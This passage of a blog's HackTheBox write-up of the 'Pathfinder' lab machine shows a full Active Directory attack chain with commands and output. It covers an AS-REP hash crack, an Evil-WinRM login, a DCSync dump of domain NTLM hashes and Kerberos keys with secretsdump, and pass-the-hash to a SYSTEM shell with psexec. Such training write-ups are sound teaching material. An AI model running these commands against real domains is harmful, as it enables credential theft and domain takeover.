+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="gp">Sheffield19      ($</span>kr5asrep<span class="nv">$23$svc_bes</span>@MEGACORP.LOCAL<span class="o">)</span>
+<span class="go">1g 0:00:00:03 DONE (2021-09-25 16:44) 0.2557g/s 2712Kp/s 2712Kc/s 2712KC/s Shokat_2..Shanelee
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+</span></pre></table></code></div></div><p>We got the password for <code class="language-plaintext highlighter-rouge">svc_bes</code>!</p><div class="language-yml highlighter-rouge"><div class="code-header"> <span data-label-text="YAML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="na">username</span><span class="pi">:</span> <span class="s">svc_bes</span>
+<span class="na">password</span><span class="pi">:</span> <span class="s">Sheffield19</span>
+</pre></table></code></div></div><p>Since we have the username and password, we can use the <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a> tool.</p><blockquote class="prompt-info"><div><p>You can install it by typing <code class="language-plaintext highlighter-rouge">gem install evil-winrm</code>.</p></div></blockquote><p>Let’s run the tool for the <code class="language-plaintext highlighter-rouge">svc_bes</code> account.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>evil-winrm <span class="nt">-u</span> svc_bes <span class="nt">-p</span> Sheffield19 <span class="nt">-i</span> 10.10.10.30
+</pre></table></code></div></div><p>This outputs:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>evil-winrm <span class="nt">-u</span> svc_bes <span class="nt">-p</span> Sheffield19 <span class="nt">-i</span> 10.10.10.30
+<span class="go">
+Evil-WinRM shell v3.3
+
+Info: Establishing connection to remote endpoint
+
+</span><span class="gp">*Evil-WinRM* PS C:\Users\svc_bes\Documents&gt;</span><span class="w">
+</span></pre></table></code></div></div><p>The user flag is under <code class="language-plaintext filepath highlighter-rouge">C:\Users\svc_bes\Desktop\user.txt</code>. Now, time to escalate privileges.</p><h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><p>Now we are going to perform <a href="https://www.qomplx.com/kerberos_dcsync_attacks_explained/">DCSync attack</a> and dump the NTLM hashes of all domain users using the Impacket’s <a href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/secretsdump.py">secretsdump.py</a> script.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
+</pre></table></code></div></div><p>This outputs:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
+<span class="go">Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f9f700dbf7b492969aac5943dab22ff3:::
+svc_bes:1104:aad3b435b51404eeaad3b435b51404ee:0d1ce37b8c9e5cf4dbd20f5b88d5baca:::
+sandra:1105:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
+</span><span class="gp">PATHFINDER$</span>:1000:aad3b435b51404eeaad3b435b51404ee:0effab7cbed356ad1429a3ad4f82a40c:::
+<span class="go">[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:056bbaf3be0f9a291fe9d18d1e3fa9e6e4aff65ef2785c3fdc4f6472534d614f
+Administrator:aes128-cts-hmac-sha1-96:5235da455da08703cc108293d2b3fa1b
+Administrator:des-cbc-md5:f1c89e75a42cd0fb
+krbtgt:aes256-cts-hmac-sha1-96:d6560366b08e11fa4a342ccd3fea07e69d852f927537430945d9a0ef78f7dd5d
+krbtgt:aes128-cts-hmac-sha1-96:02abd84373491e3d4655e7210beb65ce
+krbtgt:des-cbc-md5:d0f8d0c86ee9d997
+svc_bes:aes256-cts-hmac-sha1-96:2712a119403ab640d89f5d0ee6ecafb449c21bc290ad7d46a0756d1009849238
+svc_bes:aes128-cts-hmac-sha1-96:7d671ab13aa8f3dbd9f4d8e652928ca0
+svc_bes:des-cbc-md5:1cc16e37ef8940b5
+sandra:aes256-cts-hmac-sha1-96:2ddacc98eedadf24c2839fa3bac97432072cfac0fc432cfba9980408c929d810
+sandra:aes128-cts-hmac-sha1-96:c399018a1369958d0f5b242e5eb72e44
+sandra:des-cbc-md5:23988f7a9d679d37
+</span><span class="gp">PATHFINDER$</span>:aes256-cts-hmac-sha1-96:e1645b5547d26b38d8b5c233595585b2b4102cfb78aff9f839b9ac89c78b1584
+<span class="gp">PATHFINDER$</span>:aes128-cts-hmac-sha1-96:f6f0a930e371f5aeda450314adf6cfbd
+<span class="gp">PATHFINDER$</span>:des-cbc-md5:0e45c7d008f7ced0
+<span class="go">[*] Cleaning up...
+</span></pre></table></code></div></div><p>As you can see, we have <strong>NTLM</strong> hash for the Administrator account. We can use this to perform <strong>Pass The Hash attack</strong> and gain elevated access to the system. Also, we can use Impacket’s <a href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/psexec.py">psexec.py</a> for this too.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 /usr/share/doc/python3-impacket/examples/psexec.py MEGACORP.LOCAL/Administrator@10.10.10.30 <span class="nt">-hashes</span> &lt;NTML <span class="nb">hash</span><span class="o">&gt;</span>
+</pre></table></code></div></div><p>This outputs:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 /usr/share/doc/python3-impacket/examples/psexec.py MEGACORP.LOCAL/Administrator@10.10.10.30 <span class="nt">-hashes</span> aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
+<span class="go">Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.30.....
+</span><span class="gp">[*] Found writable share ADMIN$</span><span class="w">
+</span><span class="go">[*] Uploading file xKTsiDfe.exe
+[*] Opening SVCManager on 10.10.10.30.....
+[*] Creating service aCAn on 10.10.10.30.....
+[*] Starting service aCAn.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+</span><span class="gp">C:\Windows\system32&gt;</span><span class="w">
+</span></pre></table></code></div></div><p>And we are root! Now we can obtain the root flag, which is located in <code class="language-plaintext filepath highlighter-rouge">C:\Users\Administrator\Desktop</code>.</p><p>We are done. Pathfinder has been Pwned!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/starting-point/'>Starting Point</a>, <a href='/categories/windows/'>Windows</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/very-easy/" class="post-tag no-text-decoration" >Very Easy</a> <a href="/tags/active-directory/" class="post-tag no-text-decoration" >Active Directory</a> <a href="/tags/bloodhound/" class="post-tag no-text-decoration" >BloodHound</a> <a href="/tags/kerberos/" class="post-tag no-text-decoration" >Kerberos</a> <a href="/tags/john-the-ripper/" class="post-tag no-text-decoration" >John the Ripper</a> <a href="/tags/evil-winrm/" class="post-tag no-text-decoration" >Evil-WinRM</a> <a href="/tags/dcsync-attack/" class="post-tag no-text-decoration" >DCSync attack</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox+write-up%3A+Pathfinder+-+ib4rz&url=https%3A%2F%2Fib4rz.github.io%2Fposts%2FHTB-Pathfinder%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox+write-up%3A+Pathfinder+-+ib4rz&u=https%3A%2F%2Fib4rz.github.io%2Fposts%2FHTB-Pathfinder%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fib4rz.github.io%2Fposts%2FHTB-Pathfinder%2F&text=HackTheBox+write-up%3A+Pathfinder+-+ib4rz" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/very-easy/">Very Easy</a> <a class="post-tag" href="/tags/rce/">RCE</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/wordpress/">WordPress</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/bloodhound/">BloodHound</a> <a class="post-tag" href="/tags/capabilities/">Capabilities</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-Archetype/"><div class="card-body"> <em class="small" data-ts="1630522080" data-df="ll" > Sep 1, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox write-up: Archetype</h3><div class="text-muted small"><p> This is a write-up for the Archetype machine on HackTheBox. It belonged to the “Starting Point” series. Basic Information Machine IP: 10.10.10.27 Type: Windows Difficulty: Very Easy Scanning ...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Shield/"><div class="card-body"> <em class="small" data-ts="1632045600" data-df="ll" > Sep 19, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox write-up: Shield</h3><div class="text-muted small"><p> This is a write-up for the Shield machine on HackTheBox. It was the fourth machine in their “Starting Point” series. Basic Information Machine IP: 10.10.10.29 Type: Windows Difficulty: Very Ea...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Oopsie/"><div class="card-body"> <em class="small" data-ts="1631116080" data-df="ll" > Sep 8, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox write-up: Oopsie</h3><div class="text-muted small"><p> This is a write-up for the Oopsie machine on HackTheBox. It was the second machine in their “Starting Point” series. Basic Information Machine IP: 10.10.10.28 Type: Linux Difficulty: Very Easy...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTB-Shield/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox write-up: Shield</p></a> <a href="/posts/HTB-Cap/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox write-up: Cap</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://github.com/ib4rz">ib4rz</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/very-easy/">Very Easy</a> <a class="post-tag" href="/tags/rce/">RCE</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/wordpress/">WordPress</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/bloodhound/">BloodHound</a> <a class="post-tag" href="/tags/capabilities/">Capabilities</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
